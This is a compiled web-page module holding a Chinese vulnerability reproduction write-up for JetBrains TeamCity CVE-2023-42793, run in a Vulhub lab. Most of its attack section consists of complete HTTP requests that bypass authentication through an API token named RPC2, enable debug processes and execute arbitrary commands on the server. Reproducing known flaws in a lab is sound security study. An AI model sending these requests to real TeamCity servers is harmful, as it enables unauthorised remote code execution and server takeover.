import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as s,c as d,a as e,b as i,d as a,e as r}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),u=e("p",null,"TeamCity 是 JetBrains 的构建管理和持续集成服务器。",-1),p=e("p",null,"在 TeamCity 2023.05.3 版本及以前，存在一处由于逻辑错误导致的认证绕过漏洞，攻击者利用该漏洞最终可以在目标服务器上执行任意命令。",-1),m=e("p",null,"参考链接：",-1),v={href:"https://www.sonarsource.com/blog/teamcity-vulnerability/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/",target:"_blank",rel:"noopener noreferrer"},g=r(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 TeamCity 2023.05.3 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，需要打开 <code>http://your-vps-ip:8111/</code> 并执行一系列初始化操作，创建一个管理员账户。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718100142832.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>造成这个漏洞的原因是 TeamCity 内部对于所有以 <code>/RPC2</code> 为后缀结尾的请求都不认证权限。</p><p>而正好添加 API Token 的请求的结尾参数是 Token 的名字，我们可以添加一个名字为 <code>RPC2</code> 的 API Token：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: your-ip:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718100832922.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这样就成功绕过权限认证生成了一个新的 Token：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;token name=&quot;RPC2&quot; creationTime=&quot;2024-07-18T02:08:21.088Z&quot; value=&quot;eyJ0eXAiOiAiVENWMiJ9.NU5Lc3lneWFhQ19CRUp3MDE4bnFUTTVGck1N.N2M4NDQ5MmEtYzQwOS00NjE5LTliOWMtNGY3YzQwMDNmNDY4&quot;/&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>使用该 Token 来开启调试模式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /admin/dataDir.html?action=edit&amp;fileName=config%2Finternal.properties&amp;content=rest.debug.processes.enable=true HTTP/1.1
Host: your-ip:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.NU5Lc3lneWFhQ19CRUp3MDE4bnFUTTVGck1N.N2M4NDQ5MmEtYzQwOS00NjE5LTliOWMtNGY3YzQwMDNmNDY4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718100938365.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>开启调试模式后，就可以执行任意命令了：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /app/rest/debug/processes?exePath=id HTTP/1.1
Host: your-ip:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 0
Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.NU5Lc3lneWFhQ19CRUp3MDE4bnFUTTVGck1N.N2M4NDQ5MmEtYzQwOS00NjE5LTliOWMtNGY3YzQwMDNmNDY4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718101025802.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>利用结束后，最好能够删除名为 <code>RPC2</code> 的 API Token，避免对业务造成问题：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>DELETE /app/rest/users/id:1/tokens/RPC2 HTTP/1.1
Host: your-ip:8111
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718101113041.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,21);function h(x,f){const n=l("ExternalLinkIcon");return s(),d("div",null,[c,u,p,m,e("ul",null,[e("li",null,[e("a",v,[i("https://www.sonarsource.com/blog/teamcity-vulnerability/"),a(n)])]),e("li",null,[e("a",b,[i("https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/"),a(n)])])]),g])}const C=t(o,[["render",h],["__file","Jetbrains TeamCity 认证绕过导致远程命令执行漏洞 CVE-2023-42793.html.vue"]]);export{C as default};
